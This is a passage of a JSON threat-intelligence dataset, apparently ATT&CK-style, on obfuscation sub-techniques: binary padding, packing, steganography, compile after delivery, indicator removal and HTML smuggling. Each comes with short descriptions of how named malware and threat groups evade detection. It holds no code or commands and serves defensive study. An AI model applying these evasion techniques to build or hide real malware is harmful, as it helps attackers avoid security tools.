"PUNCHTRACK is loaded and executed by a highly obfuscated launcher."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has base64-encoded its portable executable and hidden itself under a JPG header. Ramsay can also embed information within document footers."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin uses mixed-case letters for filenames and commands to evade detection."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used malware with string encryption. RedCurl has also encrypted data and has encoded PowerShell commands using Base64. RedCurl has used PyArmor to obfuscate code execution of LaZagne.  Additionally, RedCurl has obfuscated downloaded files by renaming them as commonly used tools and has used echo, instead of file names themselves, to execute files."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can use control-flow flattening or the commercially available .NET Reactor for obfuscation."}, {"id": "S0332", "name": "Remcos", "description": "Remcos uses RC4 and base64 to obfuscate data, including Registry entries and file paths."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has modified UPX headers after packing files to break unpackers."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can encrypt data prior to exfiltration by using an RSA public key."}, {"id": "S0148", "name": "RTM", "description": "RTM strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. RTM has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can use anti-disassembly and code transformation obfuscation techniques."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has been obfuscated to help avoid detection."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can encrypt the names of requested APIs and deliver its final payload as a compressed, encrypted and base64 encoded blob."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used Base64 encoding within malware variants."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has encrypted its payload, a virtual file system, and various files."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon contains base64-encoded strings."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter encrypted gathered information with a combination of shifting and XOR using a static key."}, {"id": "S0063", "name": "SHOTPUT", "description": "SHOTPUT is obscured using XOR encoding and appended to a valid GIF file."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape itself is obfuscated and uses obfuscated API calls."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can hide malicious code in the padding regions between legitimate functions in the Pulse Secure libdsplibs.so file."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has the ability to obfuscate strings using XOR encryption."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can use \"stackstrings\" for obfuscation."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang has the ability to encode and RC6 encrypt data sent to C2."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST strings were compressed and encoded in Base64. SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe process."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can encrypt victim data with an RC4 cipher."}, {"id": "S0242", "name": "SynAck", "description": "SynAck payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has used an encrypted Virtual File System to store plugins."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses non-descriptive names to hide functionality."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can base64 encode and AES-128-CBC encrypt data prior to transmission."}, {"id": "S0647", "name": "Turian", "description": "Turian can use VMProtect for obfuscation."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to base64 encode and XOR encrypt strings."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used string encoding with floating point calculations."}, {"id": "S0117", "name": "XTunnel", "description": "A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products."}], "sub_techniques": [{"name": "Binary Padding", "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.", "detailed_description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.", "id": "T1027.001", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 used large size files to avoid detection by security solutions with hardcoded size limits."}, {"id": "G0050", "name": "APT32", "description": "APT32 includes garbage code to mislead anti-malware software and researchers."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has appended random binary data to the end of itself to generate a large binary."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta had added data prior to the Portable Executable (PE) header to prevent automatic scanners from identifying the payload."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "The CHIMNEYSWEEP installer has been padded with null bytes to inflate its size."}, {"id": "S0244", "name": "Comnie", "description": "Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL contains unused machine instructions in a likely attempt to hinder analysis."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks has added the entire unobfuscated code of the legitimate open source application Blink to its code."}, {"id": "S0082", "name": "Emissary", "description": "A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan."}, {"id": "S0367", "name": "Emotet", "description": "Emotet inflates malicious files and malware as an evasion technique."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has been packed with junk code and strings."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used random junk code to obfuscate malware code."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher contains junk code in its functions in an effort to confuse disassembly programs."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has obfuscated .NET executables by inserting junk code."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use junk code to hide functions and evade detection."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has had null characters padded in its malicious DLL payload."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to add bytes to change the file hash."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa performed padding with null bytes before calculating its hash."}, {"id": "S0528", "name": "Javali", "description": "Javali can use large obfuscated libraries to hinder detection and analysis."}, {"id": "S0236", "name": "Kwampirs", "description": "Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has been obfuscated with a 129 byte sequence of junk data prepended to the file."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection."}, {"id": "S0449", "name": "Maze", "description": "Maze has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process."}, {"id": "G0002", "name": "Moafee", "description": "Moafee has been known to employ binary padding."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used junk code within their DLL files to hinder analysis."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has used useless code blocks to counter analysis."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use large file sizes to evade detection."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has added four additional bytes of data upon launching, then saved the changed version as C:\\ProgramData\\Initech\\Initech.exe."}, {"id": "S0370", "name": "SamSam", "description": "SamSam has used garbage code to pad some of its malware components."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can obfuscate strings using junk Chinese characters."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can execute FileRecvWriteRand to append random bytes to the end of a file received from C2."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker contains junk code to increase its entropy and hide the actual code."}, {"id": "S0117", "name": "XTunnel", "description": "A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products."}, {"id": "S0248", "name": "yty", "description": "yty contains junk code in its binary, likely to confuse malware analysts."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions."}]}, {"name": "Software Packing", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.", "detailed_description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.", "id": "T1027.002", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz."}, {"id": "S0504", "name": "Anchor", "description": "Anchor has come with a packed payload."}, {"id": "G1007", "name": "Aoqin Dragon", "description": "Aoqin Dragon has used the Themida packer to obfuscate malicious payloads."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has used UPX packers for its payload DLL."}, {"id": "G0016", "name": "APT29", "description": "APT29 used UPX to pack files."}, {"id": "G0022", "name": "APT3", "description": "APT3 has been known to pack their tools."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants."}, {"id": "G0087", "name": "APT39", "description": "APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection."}, {"id": "G0096", "name": "APT41", "description": "APT41 uses packers such as Themida to obfuscate malicious files."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses a software packer called Pe123\\RPolyCryptor."}, {"id": "S0638", "name": "Babuk", "description": "Versions of Babuk have been packed."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has a variant with a packed payload."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used the MPRESS packer and similar tools for obfuscation."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has been packed with the UPX packer."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's client component is packed with UPX."}, {"id": "S0611", "name": "Clop", "description": "Clop has been packed to help avoid detection."}, {"id": "S1105", "name": "COATHANGER", "description": "The first stage of COATHANGER is delivered as a packed file."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks can implement a custom-built virtual machine mechanism to obfuscate its code."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader has been packed with UPX."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has a packed payload when delivered."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal has used UPX to pack Bandook."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet has the option to compress its payload using UPX or MPRESS."}, {"id": "S0187", "name": "Daserf", "description": "A version of Daserf uses the MPRESS packer."}, {"id": "S0281", "name": "Dok", "description": "Dok is packed with an UPX executable packer."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate packed code modules."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus's dropper can be packed with UPX."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has been delivered with encrypted resources and must be unpacked for execution."}, {"id": "S0554", "name": "Egregor", "description": "Egregor's payloads are custom-packed, archived and encrypted to prevent analysis."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has packed malware payloads before delivery to victims."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has used custom packers to protect its payloads."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has been regularly repacked by its operators to create large binaries and evade detection."}, {"id": "S0182", "name": "FinFisher", "description": "A FinFisher variant uses a custom packer."}, {"id": "S0628", "name": "FYAnti", "description": "FYAnti has used ConfuserEx to pack its .NET module."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM packed some payloads using different types of packers, both known and custom."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has been packed for obfuscation."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy is packed for obfuscation."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 uses a custom packing algorithm."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has packed ELF files into other binaries."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has used the open source UPX executable packer."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to pack its payload."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has packed and encrypted its loader module."}, {"id": "S0283", "name": "jRAT", "description": "jRAT payloads have been packed."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has packed malware with UPX."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has been packed for obfuscation."}, {"id": "S1160", "name": "Latrodectus", "description": "The Latrodectus payload has been packed for obfuscation."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has been packed with multiple layers of encryption."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has used several packing methods for obfuscation."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has used UPX packed binaries."}, {"id": "S0409", "name": "Machete", "description": "Machete has been packed with NSIS."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has been packed with VMProtect and Themida."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has used VMProtect to pack and protect files."}, {"id": "S0083", "name": "Misdat", "description": "Misdat was typically packed using UPX."}, {"id": "S1026", "name": "Mongall", "description": "Mongall has been packed with Themida."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used malware plugins packed with Themida."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has used .NET packer tools to evade detection."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used software packing in its tools."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "For Operation Dust Storm, the threat actors used UPX to pack some payloads."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D has a variant that is packed with UPX."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork payload was packed with UPX."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can encrypt and pack malicious payloads."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin contains multiple payloads that are packed for defense evasion purposes and unpacked on runtime."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder."}, {"id": "S0085", "name": "S-Type", "description": "Some S-Type samples have been packed with UPX."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has been packed using a dark market crypter."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has used a packed installer file."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke has been packed with the UPX packer."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat's loader has been packed with the compressed ShimRat core DLL and the legitimate DLL for it to hijack."}, {"id": "S0543", "name": "Spark", "description": "Spark has been packed with Enigma Protector to obfuscate its contents."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been packed with a custom packer to hide payloads."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has been packed with VMProtect."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used a .NET packer to obfuscate malicious files."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used UPX to obscure malicious code."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used UPX and Ezuri packer to pack its binaries."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has obfuscated their payloads through packing."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has packed malware and tools, including using VMProtect."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has been packed with UPX."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has been packed with Iz4 compression."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot leverages a custom packer to obfuscate its functionality."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos uses a custom packer."}, {"id": "S0476", "name": "Valak", "description": "Valak has used packed DLL payloads."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN is initially packed."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine."}, {"id": "S0248", "name": "yty", "description": "yty packs a plugin with UPX."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy's Delphi variant was packed with UPX."}, {"id": "S0230", "name": "ZeroT", "description": "Some ZeroT DLL files have been packed with UPX."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used multi-stage packers for exploit code."}]}, {"name": "Steganography", "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.", "detailed_description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.\nBy the end of 2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.", "id": "T1027.003", "examples": [{"id": "S0469", "name": "ABK", "description": "ABK can extract a malicious Portable Executable (PE) from a photo."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has hidden malicious executables within PNG files."}, {"id": "G0067", "name": "APT37", "description": "APT37 uses steganography to send images to users that are embedded with shellcode."}, {"id": "S0473", "name": "Avenger", "description": "Avenger can extract backdoor malware from downloaded images."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used .PNG images within a zip file to build the executable. "}, {"id": "S0470", "name": "BBK", "description": "BBK can extract a malicious Portable Executable (PE) from a photo."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads."}, {"id": "S0471", "name": "build_downer", "description": "build_downer can extract malware from a downloaded JPEG."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used steganography to hide shellcode in a BMP image file."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has embedded binaries within RC4 encrypted .png files."}, {"id": "S0231", "name": "Invoke-PSImage", "description": "Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used steganography to hide stolen data inside other files stored on Github."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has used image files to hide its loader component."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can hide its payload in BMP images hosted on compromised websites."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file."}, {"id": "C0023", "name": "Operation Ghost", "description": "During Operation Ghost, APT29 used steganography to hide payloads inside valid images."}, {"id": "C0005", "name": "Operation Spalax", "description": "For Operation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot loads a set of PNG images stored in the malware's resources section (RCDATA), each with an encrypted section containing portions of the core Pikabot core module. These sections are loaded and decrypted using a bitwise XOR operation with a hardcoded 32 bit key."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can use steganography to hide C2 information in images."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA)."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use .jpg and .bmp files to store its payload."}, {"id": "S0565", "name": "Raindrop", "description": "Raindrop used steganography to locate the start of its encoded payload within legitimate 7-Zip code."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has PE data embedded within JPEG files contained within Word documents."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can also embed data within a BMP image prior to exfiltration."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can hide data in images, including use of the Least Significant Bit (LSB)."}, {"id": "G0127", "name": "TA551", "description": "TA551 has hidden encoded data for malware DLLs in a PNG."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection."}]}, {"name": "Compile After Delivery", "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe, csc.exe, or GCC/MinGW.", "detailed_description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe, csc.exe, or GCC/MinGW.\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.", "id": "T1027.004", "examples": [{"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has used the csc.exe tool to compile a C# executable."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can compile and execute source code sent to the compromised AD FS server via a specific HTTP POST."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used AutoIt to compile the payload and main script into a single executable after delivery."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has compiled malware, delivered to victims as .c files, with the GNU Compiler Collection (GCC)."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can compile and execute downloaded modules at runtime."}]}, {"name": "Indicator Removal from Tools", "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.", "detailed_description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.", "id": "T1027.005", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has been known to remove indicators of compromise from tools."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods."}, {"id": "S0187", "name": "Daserf", "description": "Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has updated and modified its malware, resulting in different hash values that evade detection."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM ensured each payload had a unique hash, including by using different types of packers."}, {"id": "S0237", "name": "GravityRAT", "description": "The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has undergone regular technical improvements in an attempt to evade detection."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors edited variable names within the Impacket suite to avoid automated detection."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can remove strings from binaries."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can make small changes to itself in order to change its checksum and hash value."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates."}, {"id": "G0010", "name": "Turla", "description": "Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can scramble functions not to be executed again with random values."}]}, {"name": "HTML Smuggling", "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.", "detailed_description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.", "id": "T1027.006", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has embedded an ISO file within an HTML attachment that contained JavaScript code to initiate malware execution."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout contains JavaScript code that 